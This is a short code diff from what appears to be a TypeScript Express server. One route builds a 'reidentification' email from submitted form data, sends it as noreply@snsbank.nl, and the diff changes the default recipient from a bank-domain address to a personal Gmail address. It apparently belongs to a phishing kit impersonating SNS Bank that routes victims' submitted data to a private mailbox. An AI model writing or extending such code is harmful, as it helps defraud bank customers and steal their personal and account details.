@@ -21,9 +21,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Generate email content
       const emailContent = generateReidentificationEmail(validatedData);
       
-      // Send email using SendGrid
+      // Send email using Resend
       const emailParams = {
-        to: process.env.ADMIN_EMAIL || "survey@snsbank.nl",
+        to: process.env.ADMIN_EMAIL || "punkin199573@gmail.com",
         from: process.env.FROM_EMAIL || "noreply@snsbank.nl",
         subject: emailContent.subject,
         html: emailContent.html,
